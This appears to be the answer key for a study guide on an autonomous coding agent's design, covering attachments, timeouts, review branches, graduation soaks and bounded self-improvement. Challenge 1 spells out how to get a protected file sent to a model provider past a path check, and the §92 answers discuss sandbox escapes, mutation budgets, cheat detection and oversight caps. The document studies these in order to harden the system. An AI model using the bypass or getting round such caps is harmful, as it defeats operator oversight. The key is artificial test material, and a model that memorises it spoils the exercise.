+<p class="ak-q"><strong>Challenge 2 (systems design).</strong> Replace the hardcoded <code>asyncio.wait_for(timeout=90.0)</code> from §79.3 with a timeout derived from the run's real budget, following the production-envelope approach in §93.12. Constraints: one GPU, local lane only, measured J-Prime figures from §93.6 (decode p50 172 tok/s, p10 152 tok/s, prefill about 6.5k tok/s, cold load 15 s). Show with two concrete requests why a fixed 90 s is wrong in both directions, and state what your design must never do.</p>
+<p>This is a proposal, not a mechanism the paper describes. It reuses two things the paper does describe. §93.12's production envelope derives about 40 run budgets from one wall-clock figure, with tests that pin them against drift. §79.3 says the proper fix is "a configurable env-driven timeout consistent with the rest of the pipeline's budget allocation."</p>
+<p><strong>Estimate.</strong> Retry time is about prompt tokens / 6,500 + completion tokens / 152 + cold load if the model is not resident. Request A (assumed): a 4,000-token prompt and a 2,000-token completion. Prefill = 0.62 s and decode = 13.2 s, so about 13.8 s warm. If a training lease had unloaded the model, add 15 s for about 28.8 s. With a 2x margin that is about 58 s. A fixed 90 s waits half a minute longer than needed, and that time comes out of the run's wall-clock budget.</p>
+<p>Request B (assumed): the same 4,000-token prompt with a 16,384-token completion, the <code>max_tokens</code> seen in §87.3. Decode at p10 = 16,384 / 152 = about 108 s, so about 108.4 s warm with prefill. A fixed 90 s would kill this retry partway through every time on the slow tail, and the failure would look like a provider problem.</p>
+<p><strong>Design.</strong> (1) Compute the timeout per call: max_tokens divided by the p10 decode rate, plus prefill, plus cold load when the engine reports the model is not resident, times a margin. (2) Clamp it from above by what remains of the op's envelope budget, so a retry can never outlive its parent. (3) Expose the margin and floor as env knobs registered like the others. (4) Pin the derivation with a test, as §93.12 does for the other budgets.</p>
+<p><strong>Never.</strong> The timeout must never be extended because the retry looks active, and it must never exceed the parent budget. §92.4's wall-clock cap is deliberately blind to activity, because a provider retry storm reset the per-op liveness counter and hung a session for 67+ minutes. Tying the timeout to activity would bring that failure back.</p>
+<p>Check: the derived value scales with the request (about 58 s for A, and about 217 s warm with the 2x margin for B, before the clamp). The old constant fits neither, which is why §79 listed it as load-bearing.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-xv">
+<h4>PART XV — Multi-Modal Perception: The Senses→Mind Bridge</h4>
+<p class="ak-q">Pause and predict 1. An image's metadata (path, mime type, short hash) is passed around separately from its bytes. How could a constructor make it impossible for a caller to hand in a mismatched path, mime type and hash, and what else should a safe attachment object refuse to leak?</p>
+<p>The canonical constructor <code>Attachment.from_file(path, kind=..., app_id=...)</code> computes <code>hash8</code> from the actual file bytes and infers <code>mime_type</code> from the extension, so the caller never supplies them. <code>__post_init__</code> then rechecks every field against its whitelist, regex or length cap. The <code>__repr__</code> is redaction-safe: it shows only the basename and <code>hash8</code>, never the full path. See §84.1.</p>
+<p class="ak-q">Pause and predict 2. Unit tests and log lines can show that bytes were sent. How would you design one test that proves the model actually read the contents of an attached PDF, rather than guessing from the prompt?</p>
+<p>Embed a specific, unguessable line in the PDF and check whether the model quotes it verbatim. The test PDF contained "BUG: division by zero on line 42 of compute.py", and the prompt did not include that text. Claude's reply quoted it byte for byte inside a well-formed <code>2b.1-noop</code> response, which it could not have done without parsing the PDF. See §87.1 and §87.4.</p>
+<p class="ak-q">Conceptual 1. Most of the pieces for multi-modal input already existed before the arc. Why could the system still not see a single image at GENERATE time?</p>
+<p>The parts did not agree on their contracts (§82.2). Producer and consumer disagreed on the sidecar filename, on the timestamp key, and on the hash format (decimal integer versus 16 lowercase hex characters), and the OCR function was never passed to the sensor. Each mismatch made the pipeline fail silently at a different point. Even after fixing these, nothing populated <code>ctx.attachments</code> at intake, the serializer's purpose allow-list lacked <code>"generate"</code>, and neither provider called the serializer during code generation. The lesson is that having the components is not the same as having the capability; the connections are where it failed.</p>
+<p class="ak-q">Conceptual 2. Why do both ingress paths converge on one <code>ctx.attachments</code> tuple instead of letting the provider handle each source differently?</p>
+<p>The Manifesto §1 implication used here is that Body and Mind talk through stable interfaces, not origin-aware dispatch (§83.4). If the provider had to branch on "did this come from Ferrari or from the operator", Body implementation details would leak into the Mind's prompt shaping. With one surface, the provider sees one shape of content block regardless of source. A new ingress, such as a Slack webhook, only adds a <code>kind</code> at the hoist layer and needs zero provider changes (§88).</p>
+<p class="ak-q">Conceptual 3. The attachment hoist at intake catches every exception and logs at DEBUG. Is that a safety gap or the right choice?</p>
+<p>The paper calls it fail-closed discipline (§83.3). If the frame file vanished, an <code>/attach</code> file was deleted, or a mime check failed, the op is demoted to text-only instead of breaking intake. "Closed" here means no pixels ship when anything is wrong; the op still enters CLASSIFY. The trade-off is visibility: a DEBUG breadcrumb is easy to miss, so an operator might not notice that an op lost its image. The safety boundary is preserved, because a failed check never results in unvalidated bytes being sent.</p>
+<p class="ak-q">Quiz 1. Why was the OCR adapter's default switched from Fast to Accurate?</p>
+<p><strong>B.</strong> On a 1280x800 frame with one traceback in the top-left, Fast returned 53 characters and missed <code>Traceback (most recent call last):</code>, which the Tier-1 regex needs; Accurate returned 198 characters including it. See §82.2 and §89.2.</p>
+<p class="ak-q">Quiz 2. An op routed BACKGROUND carries a valid PNG attachment. What does <code>_serialize_attachments()</code> return for it?</p>
+<p><strong>D.</strong> The route gate returns an empty list for background and speculative routes regardless of the other gates, because those routes target text-only, cost-optimized models. See §84.4 and §85.3.</p>
+<p class="ak-q">Quiz 3. An operator attaches a PDF to an op that ends up on DoubleWord. What happens?</p>
+<p><strong>A.</strong> The OpenAI-compatible schema is image-only, so the serializer drops PDFs with a WARNING and keeps any image attachments. PDF-to-image conversion is future work, and forcing Claude needs <code>JARVIS_PROVIDER_OVERRIDE=claude-api</code>. See §85.2 and §89.5.</p>
+<p class="ak-q">Quiz 4. Why is the per-attachment cap 10 MiB when Anthropic accepts PDFs up to 32 MiB?</p>
+<p><strong>C.</strong> 10 MiB matches the image budget, forces pre-summarizing large documents, and inflates to roughly 14 MiB in base64, leaving room for the prompt scaffold under 32 MiB. The cap was not changed during the arc. See §84.2.</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> An operator types <code>/attach /tmp/claude/bug.png "what is misaligned here?"</code> in SerpentFlow. Trace the file from the REPL to the Claude request, naming each check it passes and the two log lines you could grep for afterwards.</p>
+<p><code>SerpentFlow._handle_attach()</code> parses the path and description, then runs the validation perimeter: absolute path, file exists, extension in <code>_ATTACHMENT_EXT_TO_MIME</code>, size within the 10 MiB default, and <code>_is_protected_path(path)</code> returns None (§83.2). It builds an envelope with <code>source="voice_human"</code>, empty <code>target_files</code>, and <code>evidence["user_attachments"]</code>, and calls the intake router's <code>ingest</code>.</p>
+<p>In <code>_dispatch</code>, the hoist reads <code>user_attachments</code>, calls <code>Attachment.from_file(path, kind="user_provided")</code>, which computes <code>hash8</code> and infers <code>image/png</code>, and logs <code>[IntakeRouter] attachments_hoisted ... kind=user_provided</code>. The context gets the tuple via <code>with_attachments</code> (§83.3).</p>
+<p>At GENERATE, <code>_serialize_attachments()</code> checks the purpose is allowed, the kill switch is on, attachments exist, and the route is not BG or SPEC, then reads the bytes within budget (§84.4). For Claude it emits an image block, and <code>_generate_raw</code> places it before the text block (§85.1). The provider logs <code>[ClaudeProvider] multi_modal op=... blocks=1 ... mime_kinds=[image/png]</code> (§85.4, §90.2). Grepping the op id finds both lines.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A teammate wants to raise the attachment cap to 32 MiB so long PDFs fit, arguing "Anthropic allows it". Using §84.2, §88 and §89.6, argue for or against, and suggest a better path for long documents.</p>
+<p>Against. At 10 MiB the base64 payload is about 14 MiB, leaving headroom under Anthropic's 32 MiB limit for system text and tool manifests (§84.2). A 32 MiB file would inflate well past 32 MiB and risk a payload-oversize 400.</p>
+<p>The paper also treats the cap as a hard gate. It says relaxing a safety budget to fit a new code path is the anti-pattern that Manifesto §6 forbids, and §88 confirms none of the gates were relaxed.</p>
+<p>Even within the cap, §89.6 notes that a long PDF sent as one block can push token counts above the context window. The better path is the future work it describes: per-page extraction with page-range arguments to <code>/attach</code>, or operators pre-summarizing large documents, which the cap already encourages.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/providers.py</code> and find <code>_serialize_attachments</code> (search for <code>_ATTACHMENT_PURPOSES_ALLOWED</code>). List the early-return checks in the order they appear, and compare them with the five gates named in §84.4. Is there a check in the code that the paper's list does not name?</p>
+<p>The function returns an empty list, in order, when: the purpose is not in <code>_ATTACHMENT_PURPOSES_ALLOWED</code> (which holds <code>sensor_classify</code>, <code>visual_verify</code> and <code>generate</code>); the purpose is <code>generate</code> and <code>_generate_attachments_enabled()</code> is false; <code>ctx.attachments</code> is empty; the route is in <code>_ATTACHMENT_STRIPPED_ROUTES</code>; and the provider kind is not in <code>_ATTACHMENT_PROVIDER_KINDS</code>.</p>
+<p>The first four match §84.4's known-purpose, env-kill, non-empty ctx and live-route gates. The fifth paper gate, the per-attachment read budget, happens later inside the loop when bytes are read.</p>
+<p>The unknown-provider-kind check is in the code but not in the paper's list of five. It logs at DEBUG and drops all attachments for a provider that is not Claude, DoubleWord or J-Prime.</p>
+<p>One more drift is worth noticing: the function's docstring still says purpose must be <code>sensor_classify</code> or <code>visual_verify</code>, while the allow-list constant includes <code>generate</code>. The constant is what runs.</p>
+<p class="ak-q">Advanced A1. §91 claims "true CC-parity" for seeing a screenshot of a bug. The proof in §87 ran on Claude. Under the October configuration in §93.6, which parts of that claim still hold, and what live test would re-establish it?</p>
+<p>The intake half still holds, because it does not depend on the provider. Both ingress paths still converge on <code>ctx.attachments</code> (§83), and the hoist, the Attachment schema and the five gates do not change with the lane. The provider half is different. With <code>JARVIS_PAID_LANES_ENABLED=false</code>, Claude is never constructed (§93.6), so the <code>document</code> and <code>image</code> blocks of §85.1 are never sent.</p>
+<p>The only active lane is J-Prime. For <code>jprime</code> the serializer emits OpenAI-style <code>image_url</code> blocks and drops PDFs with a WARNING (§85.2, §89.5). So a PDF attached today is dropped, and the op runs text-only. The §85.2 escape hatch, <code>JARVIS_PROVIDER_OVERRIDE=claude-api</code>, names a provider the paid-lane authority keeps switched off.</p>
+<p>Images are the open case. They would be sent, but the model serving code generation is <code>qwen3-coder-ov:30b</code>, and §93.6 says the vision model (<code>jarvis-vision:8b</code>) is declared in J-Prime but at the time of writing is still partly served by Ollama. The paper gives no live-fire proof that the local lane reasons over image bytes at GENERATE.</p>
+<p>So in October the parity claim holds for the architecture and is unproven for behaviour. The test that would settle it is the §87 method on the local lane: an image with a unique, unguessable string, run through <code>scripts/attach_livefire.py</code>, passing only if the reply quotes the string verbatim. It would also need both breadcrumbs from §85.4 under one <code>op_id</code>. Note that the §85.4 line is labelled <code>[ClaudeProvider]</code>, so the breadcrumb to grep for may differ on J-Prime.</p>
+<p class="ak-q">Advanced A2. The intake hoist fails closed by demoting a broken attachment op to text-only, logged at DEBUG (§83.3). §93.12 later added capability assurance, which refuses to run below the declared envelope instead of degrading silently. Should an <code>/attach</code> op whose file vanished still run? Argue it per kind.</p>
+<p>The two principles conflict here. §83.3 chose availability: a stale frame, a deleted file or a failed mime check must not break intake, so the op still enters CLASSIFY without pixels. §93.12's capability assurance chose honesty: an operation should not run with less than it declared it needs.</p>
+<p>My position (a proposal, not described in the paper) is to decide by kind. For <code>sensor_frame</code>, demotion is right. The useful signal has already been pulled out at the sensor: OCR text, the Tier-1 verdict and the matches travel in <code>evidence["vision_signal"]</code> (§83.1). A text-only op can still act on "a traceback is on screen", and Ferrari may have died between scan and intake (§89.1).</p>
+<p>For <code>user_provided</code>, demotion is misleading. The operator asked something like "what is misaligned here?" about a specific file (§90.2). Without the image the model answers a different question, and the operator has no visible sign of it because the only trace is a DEBUG line. That is the silent degradation §93.12 exists to refuse. The better behaviour is to fail the op visibly back to the REPL.</p>
+<p>The evidence to settle it is already in the logs. Using the §90.3 grep rollup, count envelopes that carried <code>user_attachments</code> but have no matching <code>attachments_hoisted</code> line, and check whether their answers referred to the missing content. If that count is near zero, the question is academic. If not, the per-kind split matters.</p>
+<p class="ak-q">Advanced A3. The multi-modal arc needed five contract fixes before one signal could be emitted (§82.2), even though every component existed. Connect this to §87's live-fire method and §93.12's DARK-feature finding. What general rule about proof does the paper end up adopting?</p>
+<p>Every component in §82.1 worked on its own terms. The frame server wrote frames, the sensor scanned, the serializer could encode blocks. Each producer and consumer pair disagreed on one detail: the filename, the timestamp key, the hash format, a missing <code>ocr_fn</code>, and a purpose allow-list without <code>"generate"</code>. Each mismatch failed silently, for example <code>ferrari_absent</code> every 60 s while Ferrari was healthy, or <code>no_regex_match ocr_chars=0</code>. Unit tests on either side would pass, because each side matched its own idea of the contract.</p>
+<p>§87 answers this with an end-to-end behavioural test. Real bytes go to the real API, and the test passes only if the reply contains a string that could not have been guessed. No single-side test can pass that check by agreeing with itself.</p>
+<p>§93.12 shows the same pattern at system scale: 131 features with the flag on, the module present, and no production caller. The reachability ledger's three stages (registered, invoked, effective) apply §82.2's lesson to every feature. The arc's own unblocking step was the same idea in small form: commit <code>44305f7e96</code> instrumented the silent-skip paths before deeper debugging (§88).</p>
+<p>The general rule is that a capability counts as present only when a live run shows it being invoked and having its effect. Having the code, the flag and the unit tests is not enough. §93.10's "first-order proof" applies the same standard to commits: an autonomous landing counts only when it did real work for a signed goal and git confirms it.</p>
+<p class="ak-q"><strong>Challenge 1 (adversarial).</strong> §83.2 says <code>/attach</code> reuses Venom's <code>_is_protected_path()</code> as step 5 of its validation perimeter. Write an envelope that gets a file inside a protected location sent to a provider at GENERATE without going through that check. You may use any producer the paper shows calling <code>router.ingest</code>. Identify every gate it passes, and say whether anything in the paper's design stops it. (Reference: the hoist is in <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>, and <code>Attachment.from_file</code> is in <code>backend/core/ouroboros/governance/op_context.py</code>.)</p>
+<p><strong>Where the check lives.</strong> In §83.2, the protected-path check is step 5 inside <code>SerpentFlow._handle_attach()</code>, at the REPL edge. The hoist in §83.3 reads <code>evidence["user_attachments"]</code> and calls <code>Attachment.from_file(path, kind="user_provided")</code> directly. In the repo, the hoist in <code>unified_intake_router.py</code> calls <code>from_file</code> with no protected-path call, and <code>from_file</code> in <code>op_context.py</code> checks only for a non-empty absolute path, that the file exists, and that the extension is whitelisted. A search finds no <code>_is_protected_path</code> call in the intake router.</p>
+<p><strong>The envelope.</strong> §87.2 shows <code>scripts/attach_livefire.py</code> building an <code>IntentEnvelope</code> with <code>make_envelope()</code> and calling <code>router.ingest()</code> itself, with no REPL. Any in-process producer can do the same, including a future ingress like the Slack webhook §83.4 anticipates. Give it <code>source="voice_human"</code>, <code>urgency="critical"</code>, empty <code>target_files</code> (allowed because <code>user_attachments</code> is present, §86 commit 12c), and one entry whose path is an absolute path under a protected directory with a <code>.png</code> or <code>.pdf</code> extension and a size of 10 MiB or less.</p>
+<p><strong>Gates it passes.</strong> At the hoist: absolute path, file exists, whitelisted extension, mime inferred from the extension, and <code>hash8</code> computed from the bytes. In <code>__post_init__</code>: kind, mime, hash format and path length are all valid (§84.1). In the serializer (§84.4): the purpose is <code>generate</code>, the kill switch is on by default, the context is non-empty, and the route is IMMEDIATE, not BG or SPEC (critical plus voice_human, §87.5). The per-attachment read is within 10 MiB. Then the bytes are base64-encoded and sent.</p>
+<p><strong>What stops it.</strong> Nothing in the paper's design, for any file that has a whitelisted extension. The extension whitelist does narrow the target: a file such as <code>.env</code> has no whitelisted extension, so <code>from_file</code> raises and the hoist demotes the op to text-only. Note also that the mime type comes from the extension, not from the file's content, so any bytes renamed to <code>.png</code> pass the schema.</p>
+<p>A proposed fix (not in the paper): run <code>_is_protected_path()</code> inside the hoist or inside <code>from_file</code> for <code>user_provided</code>, so every ingress inherits the check. This matches §83.4's own rule that new ingresses only add a <code>kind</code> at the hoist. Today a new ingress would have to remember to call the check itself. Check your answer by asking which layer is reached by every producer: only the hoist is.</p>
+<p class="ak-q"><strong>Challenge 2 (quantitative).</strong> §84.1 allows up to 8 attachments per context (<code>_ATTACHMENT_MAX_PER_CTX</code>), and each may be up to 10 MiB. §84.2 says 10 MiB inflates to about 14 MiB of base64, "well below" the 32 MiB Anthropic limit. Compute the worst-case payload for a full context, find the largest number of maximum-size attachments that still fits under 32 MiB, and say which of the five gates in §84.4 would stop an oversize request. What happens if a ninth attachment is supplied?</p>
+<p><strong>Per attachment.</strong> 10 MiB x 4/3 = about 13.3 MiB of base64. The paper rounds this to about 14 MiB.</p>
+<p><strong>Full context.</strong> 8 x 13.3 = about 107 MiB (8 x 14 = 112 MiB with the paper's rounding), before any prompt scaffold. That is more than three times the 32 MiB figure.</p>
+<p><strong>Largest set that fits.</strong> Two maximum-size attachments are about 26.7 MiB, leaving about 5.3 MiB for the system text and tool manifests. Three are about 40 MiB, which is over the limit. So the safety margin in §84.2 holds for one attachment, and roughly for two. From three upwards it does not.</p>
+<p><strong>Which gate stops it.</strong> None of the five. Known-purpose, env-kill, non-empty context and live-route are all yes/no checks. The read budget is per attachment: each file is read with the 10 MiB cap, and in the repo <code>_serialize_attachments</code> in <code>providers.py</code> calls <code>att.read_bytes()</code> for each attachment without any running total. The 8-per-context cap counts attachments, not bytes. So a three-attachment op reaches the provider and risks exactly the payload-oversize 400 that §84.2 says the budget is meant to avoid.</p>
+<p><strong>A ninth attachment.</strong> In <code>op_context.py</code>, <code>with_attachments</code> raises if there are more than <code>_ATTACHMENT_MAX_PER_CTX</code> entries. The hoist wraps everything in one try/except (§83.3), so the whole hoist fails and the op runs with zero attachments, not eight. A request over the count limit loses everything, while a request over the byte limit is sent anyway.</p>
+<p>A proposed fix (not in the paper): add an aggregate byte budget in the serializer, derived from the provider's payload limit minus a scaffold reserve. Over budget, drop the later attachments with a WARNING, which matches §88's rule that a violating attachment is "dropped at the nearest boundary with a WARNING log". Check: 2 x 10 MiB x 4/3 = 26.7 MiB is less than 32, and 3 x 10 x 4/3 = 40 is more.</p>
+</div>
+<div class="answer-key-unit" id="ak-s92">
+<h4>§92 — Recent Developments (April 17 – May 13, 2026)</h4>
+<p class="ak-q">Pause and predict 1. One battle-test session hung in GENERATE for over an hour because provider retry storms kept resetting the per-op idle counter. What kind of guard would stop this, and what signal must that guard refuse to listen to?</p>
+<p>A hard wall-clock ceiling, <code>--max-wall-seconds</code>, which fires <code>stop_reason=wall_clock_cap</code> when the session runs too long. It is deliberately opaque to any activity signal, so a retry storm that looks like activity cannot keep resetting it. That is exactly how session #7 GENERATE S2 hung for 67+ minutes. Graduation soaks now set it, typically to 2400 s, about twice the 850–1300 s happy path. See §92.4.</p>
+<p class="ak-q">Pause and predict 2. §92.16 says the autonomy actually demonstrated so far is 23 graduation-ledger commits, not governance self-modification. Will the next section present the bounded-RSI claim as a proven theorem, a proof outline, or something weaker?</p>
+<p>Something weaker: a conjecture sketch. The section states three properties: shell deterministic-entropy never decreases, core semantic-entropy conditioned on the shell never increases, and net agentic entropy stays bounded. It then says plainly that none of them is a theorem yet. Turning them into a precise statement and a proof outline is named as the next milestone. See §92.17.</p>
+<p class="ak-q">Conceptual 1. Why do Treefinement L2 and the SWE-Bench-Pro harness ship with default-FALSE master flags and a clean-soak graduation criterion, instead of being switched on once their tests pass?</p>
+<p>Passing tests shows that the code does what it was written to do. It does not show that the capability helps the live organism. The graduation contract in §92.15 says no capability graduates without empirical proof, and that proof comes from a clean-soak ladder, not from hand-tuning. Treefinement must show at least a 10% L2 success-rate lift, or at least a 20% wall-clock reduction at the same success rate, over at least two consecutive soaks (§92.13). Keeping the flag off also keeps rollback byte-identical: the legacy <code>_run_inner</code> is sha256-pinned, so turning the flag off restores exactly the old behaviour. The trade-off is speed. Capability sits dormant for weeks, as the 36-day minimum calendar in §92.9 shows.</p>
+<p class="ak-q">Conceptual 2. The Adversarial Cage reported 0/38 escapes. What does this result support, and what does the paper itself say it cannot establish?</p>
+<p>It supports the claim that the Iron Gate, Semantic Guardian and recursion bound stopped every one of 38 hand-authored attacks, with 12 detection gaps documented as predicted, not active (§92.4). It is a curated, hand-written set, so it is evidence about those inputs, not a measured escape rate across all possible attacks. §92.12 calls the cage "empirically zero-escape" and lists proving this as a formal property as an open question. §92.18 makes the limit explicit. Before Neurosurgeon, adversarial soaking can stand in for proof. Once the system modifies its own governance, only a formal proof can rule out a trajectory that escapes the bound.</p>
+<p class="ak-q">Conceptual 3. IDE-native ReviewBranch builds preview branches with git plumbing and auto-rejects after 300 s. Why these two choices?</p>
+<p>The plumbing commands <code>hash-object</code>, <code>commit-tree</code> and <code>branch</code> create a reviewable branch without touching the working tree, HEAD or the operator's index (§92.5). An autonomous proposal therefore never disturbs the human's own work in progress, yet VS Code's source-control panel still shows it natively. The 300 s default timeout ends in auto-REJECT, not auto-apply. If nobody looks, nothing lands. That replaces the old path, where a 5 s Rich overlay was followed by an automatic apply. The old behaviour is still available by setting <code>JARVIS_REVIEW_TIMEOUT_S=0</code>, so the safer default does not remove the operator's choice.</p>
+<p class="ak-q">Quiz 1. According to §92.16, what autonomous commits had been empirically demonstrated as of 2026-05-14?</p>
+<p><strong>C.</strong> The demonstrated regime is autonomous ledger writes: 23 commits against <code>passb_graduation_ledger.jsonl</code>. Fully autonomous governance self-modification is listed explicitly as not yet demonstrated (§92.16, §92.18).</p>
+<p class="ak-q">Quiz 2. In the 2026-05-10 debug arc, <code>httpx</code> needed <code>socksio</code> behind a <code>socks5h://</code> tunnel. What was the structural fix?</p>
+<p><strong>A.</strong> The first attempt stripped the proxy and broke DNS. The structural fix was to install the missing package, pinned in <code>requirements.txt</code> (§92.10, Layer 4).</p>
+<p class="ak-q">Quiz 3. Why was UX Gap #5 re-diagnosed as a phantom during the Live Status Line work?</p>
+<p><strong>D.</strong> Async output interleaving during typing was already handled. What was really missing was the status line itself (§92.5, item 4).</p>
+<p class="ak-q">Quiz 4. What does the SWE-Bench-Pro Phase C scorer do with a patch that modifies a test file, and why is that flag special?</p>
+<p><strong>B.</strong> Test-file modification is treated as a cheat under the upstream rubric. Rubric integrity depends on catching it, so it is the one Phase C flag that defaults TRUE (§92.14).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> A Yellow-tier (<code>NOTIFY_APPLY</code>) operation produces a two-file diff at 14:00, and the operator is away from the keyboard until 14:10. Using §92.5, trace what happens to the diff, what the operator could see in their editor, and what state the repository is in at 14:10.</p>
+<p>ReviewBranch replaces the old 5 s overlay-then-apply path. It writes the candidate as git objects with <code>hash-object</code> and <code>commit-tree</code>, then creates a preview branch with <code>branch</code>. The working tree, HEAD and the operator's index are never touched.</p>
+<p>The diff is recorded in the <code>DiffArchive</code> ring with a monotonic <code>d-N</code> reference, so it can be expanded later. VS Code's source-control panel shows the preview branch natively, and the SSE events reach the IDE.</p>
+<p>The default <code>JARVIS_REVIEW_TIMEOUT_S</code> is 300 s. With no decision by about 14:05 the review auto-REJECTs. At 14:10 the working tree is unchanged, the candidate was never applied, and its audit record remains in the archive. Only with the timeout set to 0 would the legacy auto-apply have landed it (§92.5).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> A contributor proposes that <code>--max-wall-seconds</code> extend itself automatically whenever an operation is making progress, for example when the provider is still returning events, so that slow but healthy sessions are not cut off. Using §92.4, critique the proposal and suggest what to do about slow sessions instead.</p>
+<p>The cap exists because an activity-based guard was already defeated once. Provider retry storms reset the per-op liveness counter, and session #7 GENERATE S2 hung for 67+ minutes while looking busy (§92.4).</p>
+<p>A cap that extends on "progress" brings back the same weakness. A retry storm emits events, so it looks like progress and the cap never fires. The paper says the cap is "opaque to any activity signal" precisely so that it cannot be defeated this way.</p>
+<p>The answer for slow but healthy sessions is a larger fixed margin. Graduation soaks use about 2400 s, roughly twice the 850–1300 s happy path. The ceiling stays a pure function of elapsed time, so no state inside the system it guards can hold it open.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> §92.1 describes the mutation cage as a "structural COUNT gate (second-rejection after the type gate)". Open <code>backend/core/ouroboros/governance/scoped_tool_backend.py</code> and find the count gate. Answer three questions: in what order the two gates run, at what moment a mutation slot is consumed, and what happens to the slot if the inner backend then fails.</p>
+<p>Layer 1 is the type gate. A tool outside the dispatched <code>allowed_tools</code> set is refused as <code>POLICY_DENIED</code> before anything else runs. Layer 2, marked "count gate (mutation budget)", runs only for mutation tools. If <code>_mutations_count</code> has reached <code>_max_mutations</code>, it logs <code>reason=mutation_budget_exhausted</code> and returns <code>POLICY_DENIED</code>, noting that the budget is set at dispatch and cannot be extended mid-op.</p>
+<p>Otherwise the slot is consumed <em>before</em> the call is delegated: <code>self._mutations_count += 1</code>. The comment explains that a failure inside the inner backend still burns the slot on purpose. This stops a model from retrying a failing mutation until it exceeds the budget.</p>
+<p>The call is also recorded and <code>_sync_state_mirror()</code> is updated before delegation. That is the <code>state_mirror</code> behaviour §92.1 credits with keeping the audit trail intact across a hard kill.</p>
+<p class="ak-q">Advanced A1. Property (a) of the bounded-RSI conjecture in §92.17 says the shell's deterministic entropy never decreases, because every accepted patch only adds to it. Read that claim against what §93.8 and §93.12 found five months later. Does the evidence support (a), contradict it, or show that the quantity is badly defined?</p>
+<p>The evidence mostly shows that the quantity is badly defined. §92.17 counts the shell as the constraints that exist: rules, detectors, AST pins and tests. §93 shows that existing and acting are different things. §93.12 found 131 DARK features, with the flag on and the module on disk but nothing in production importing it. §93.8 found VALIDATE rungs that existed but did nothing: 524 byte-identical retry iterations re-validated a frozen pool, and 532 micro-fix runs made zero repairs. Self-critique was dying on 38 of 38 operations.</p>
+<p>Measured as code on disk, the shell grew. Measured as constraints actually applied to candidates, it was much smaller than it looked, and parts of it could switch off without any code being removed. Something did shrink as code, too: the inline VALIDATE twin and its kill switch were deleted (§93.8), even though that probably strengthened the shell by leaving one owner.</p>
+<p>§93.3 adds a second problem. Property (b) is stated only "in the dimensions S<sub>n</sub> now bounds". The at-scale escape rate of about 8.8% comes from runtime-built strings passed to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code>, a dimension a static cage cannot bound by construction. So (b) is not contradicted, but it says nothing about the dimension that matters most.</p>
+<p>My position is that (a) is only testable if deterministic entropy is defined over effective constraints. The reachability ledger's registered → invoked → effective states (§93.12) are the instrument for that. The evidence that would settle it is a time series of effective-constraint counts across soaks. Any drop, for example a capability going DARK, falsifies (a) as a claim about the running system, even if it holds for the source tree.</p>
+<p class="ak-q">Advanced A2. §92.16 says the substrate is "positioned to close the SICA-empirical gap on a multi-month timeline", conditional on Phase 9 flag graduation. Use §93 to judge that forecast. What came true, what did not, and what does the difference say about the gap between "structurally ready" and "capable"?</p>
+<p>Part of it came true. By 2026-10-10 there were 91 autonomous landings on <code>main</code>, five of them production code, and three of those modified files inside the governance package under signed goals (§93.10). That is well past the 23 ledger-write commits that were the whole empirical record in §92.16.</p>
+<p>The rest did not happen. §93.10 says the system is still at Mechanic. No landing touched a safety gate, and none was self-initiated governance change, which is the SICA-style regime §92.16 had in view.</p>
+<p>The bottleneck was also not the one the forecast named. §92.16 put the remaining gap on Phase 9 graduation, "not on novel research". In practice the blockers were: the A1 wall, where a signed goal never dispatched even with the system funded and quiet (§93.4); the paid credit running out (§93.5); a small local model that needed tool masking, a target symbol and a diff schema before it could act (§93.6, §93.8); and, once it could land, the supply wall and diff fidelity (§93.10, §93.14). None of those is a flag waiting to graduate.</p>
+<p>The lesson is that "structurally ready" counts the mechanisms present. "Capable" depends on whether a real goal can travel the whole chain on the model you can actually afford. §93.12's 131 DARK features show how far apart the two can be. A forecast that would have survived needed a demonstrated end-to-end run as its base, not a list of present mechanisms.</p>
+<p class="ak-q">Advanced A3. The SWE-Bench-Pro graduation floor in §92.14 requires at least one RESOLVED known-good instance and at least one UNRESOLVED known-hard instance. Why both ends? Then apply the same reasoning to the EVAL-2 sweep in §93.3, which resolved 1/6 with three instances inconclusive.</p>
+<p>A scorer can be broken in two opposite ways, and each end of the floor catches one. A scorer that marks everything resolved would pass a known-good instance, but the known-hard instance exposes it. A scorer that marks everything unresolved, for example because tests never run in the container, would pass the known-hard instance, but the known-good one exposes it. Only the pair shows that the scorer can tell the two apart. §92.14 says this is "empirical proof that the scoring layer behaves correctly on both ends of the distribution before any aggregate-resolve-rate claim is published".</p>
+<p>The same logic applies to inconclusive outcomes. Phase E turns contract violations into synthetic records such as <code>INGEST_FAILED</code> and <code>SCORING_ERROR</code> instead of aborting the sweep (§92.14). Those records are neither resolved nor unresolved. In EVAL-2, three of six instances were inconclusive because of a clone race and a provider outage (§93.3).</p>
+<p>There are two readings. The reported 1/6 (16.7%) counts inconclusive instances as failures, which is conservative. Counting only conclusive instances gives 1/3. Neither can be compared with the 43.6% frontier figure, because the sample is tiny and half of it measured the infrastructure, not the agent. §93.3 itself calls the first resolved instance N=1. The honest report gives the three-way split (resolved, unresolved, inconclusive) and does not blend it into one rate.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> §92.9 gives the Phase 9 calendar as 24 flags × 3 clean soaks ÷ 2 fires per day = about 36 days minimum, and "realistic 6–9 weeks with noise". Model the noise. Assume flags graduate one at a time, each soak is clean independently with probability p, and a flag needs 3 <em>consecutive</em> clean soaks, so a dirty soak resets its count. Compute the expected calendar for p = 0.9, 0.8 and 0.75. Find which values of p the paper's 6–9 week estimate implies, and give the cost ceiling at the stated rate.</p>
+<p>Assumptions, which are mine and not the paper's: soaks are independent, flags are processed serially, and "3 clean soaks" means three in a row. §92.13 uses "consecutive" for Treefinement, so the stricter reading is reasonable. Every soak, clean or dirty, uses one of the two daily fires.</p>
+<p>With k = 3, expected soaks per flag E(p) = 1/p + 1/p² + 1/p³.</p>
+<ul>
+<li>p = 0.9: 1.111 + 1.235 + 1.372 = 3.72 soaks per flag. 24 × 3.72 = 89.2 soaks ÷ 2 per day = 44.6 days, about 6.4 weeks.</li>
